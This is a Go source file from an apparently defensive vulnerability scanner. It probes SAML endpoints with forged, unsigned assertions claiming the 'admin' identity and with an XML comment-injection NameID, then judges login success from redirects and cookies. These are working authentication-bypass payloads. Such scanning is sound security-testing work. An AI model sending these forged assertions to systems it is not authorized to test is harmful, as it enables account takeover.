package saml

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"

	"github.com/yupiyy/bhyakugan/internal/core"
)

var SAMLEndpoints = []string{
	"/saml/acs",
	"/saml2/acs",
	"/SAML2/POST",
	"/auth/saml/callback",
	"/saml/consume",
}

// Scan checks for SAML vulnerabilities
func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	var wg sync.WaitGroup

	for _, path := range SAMLEndpoints {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			target := baseURL + strings.TrimPrefix(p, "/")
			checkSAMLEndpoint(target, client, onFound)
		}(path)
	}

	wg.Wait()
}

func checkSAMLEndpoint(target string, client *http.Client, onFound func(core.Finding)) {
	// 1. Initial Check (Does endpoint exist?)
	resp, err := client.Get(target)
	if err != nil {
		return
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if !shouldProbeSAMLEndpoint(target, resp.StatusCode, string(body)) {
		return
	}

	// Endpoints that accept SAML usually return 405 (Method Not Allowed) or 400 on GET
	if resp.StatusCode == 405 || resp.StatusCode == 200 || resp.StatusCode == 400 {
		fmt.Printf("[*] Potential SAML Endpoint: %s\n", target)
		
		// 2. Test Signature Stripping (Critical Bypass)
		testSignatureStripping(target, client, onFound)
		
		// 3. Test XML Comment Injection
		testCommentInjection(target, client, onFound)
	}
}

func shouldProbeSAMLEndpoint(target string, statusCode int, body string) bool {
	bodyLower := strings.ToLower(body)
	bodyHasSAMLSignal := strings.Contains(bodyLower, "saml") ||
		strings.Contains(bodyLower, "assertionconsumer") ||
		strings.Contains(bodyLower, "sso")

	// 200 pages must explicitly contain SAML signals.
	if statusCode == 200 && !bodyHasSAMLSignal {
		return false
	}

	// 400/405 are often SAML endpoints expecting POST payload.
	return statusCode == 200 || statusCode == 400 || statusCode == 405
}

func testSignatureStripping(target string, client *http.Client, onFound func(core.Finding)) {
	// A basic SAML response XML without signature
	samlXML := `<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" ID="id123" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id456" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
        <saml2:Subject><saml2:NameID>admin</saml2:NameID></saml2:Subject>
        <saml2:AuthnStatement AuthnInstant="2024-01-01T00:00:00Z"><saml2:AuthnContext><saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml2:AuthnContextClassRef></saml2:AuthnContext></saml2:AuthnStatement>
    </saml2:Assertion>
</saml2p:Response>`

	encoded := base64.StdEncoding.EncodeToString([]byte(samlXML))
	
	data := url.Values{}
	data.Set("SAMLResponse", encoded)

	// Disable redirect following to inspect Location header
	// We need a custom client/transport or just use CheckRedirect
	// But the shared client likely follows redirects.
	// If it follows redirects, we check the Final URL.
	
	resp, err := client.PostForm(target, data)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// If server accepts an unsigned response and logs us in (Redirect or 200 with success)
	if resp.StatusCode == 302 || resp.StatusCode == 200 {
		location := resp.Header.Get("Location")
		cookie := resp.Header.Get("Set-Cookie")
		finalURL := resp.Request.URL.String() // If followed

		// Heuristic: Is this a LOGIN SUCCESS?
		isSuccess := false
		
		// 1. Check Location/URL for "dashboard", "home", "account"
		// AND ensure it does NOT contain "login", "error", "fail", "logout"
		targetLower := strings.ToLower(location + finalURL)
		if (strings.Contains(targetLower, "dashboard") || strings.Contains(targetLower, "home") || strings.Contains(targetLower, "account")) &&
		   !strings.Contains(targetLower, "login") && 
		   !strings.Contains(targetLower, "signin") && 
		   !strings.Contains(targetLower, "error") && 
		   !strings.Contains(targetLower, "fail") {
			isSuccess = true
		}

		// 2. Check Cookie for specific session indicators (if no redirect or redirect is internal)
		if !isSuccess && cookie != "" {
			// Just "session" is too generic. Look for "auth", "token", "jwt", "id"
			// AND ensure we aren't just being redirected to login which sets a tracking cookie
			if (strings.Contains(strings.ToLower(cookie), "auth") || strings.Contains(strings.ToLower(cookie), "token")) && !strings.Contains(targetLower, "login") {
				isSuccess = true
			}
		}

		if isSuccess {
			fmt.Printf("[!] POSITIVE MATCH: SAML Signature Stripping at %s\n", target)
			onFound(core.Finding{
				Type:     "SAML Vulnerability",
				Target:   target,
				Detail:   fmt.Sprintf("Server accepted an unsigned SAML Response (Signature Stripping).\nRedirect/URL: %s\nCookie: %s", location+finalURL, cookie),
				Severity: "Critical",
			})
		}
	}
}

func testCommentInjection(target string, client *http.Client, onFound func(core.Finding)) {
	// SAML with Comment Injection: admin<!--comment-->@target.com
	samlXML := `<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" ID="id789" Version="2.0">
    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id012" Version="2.0">
        <saml2:Subject><saml2:NameID>admin<!--injection-->@local.host</saml2:NameID></saml2:Subject>
    </saml2:Assertion>
</saml2p:Response>`

	encoded := base64.StdEncoding.EncodeToString([]byte(samlXML))
	data := url.Values{}
	data.Set("SAMLResponse", encoded)

	resp, err := client.PostForm(target, data)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Do not report informational-only SAML probing to avoid noisy false positives.
	_ = onFound
}
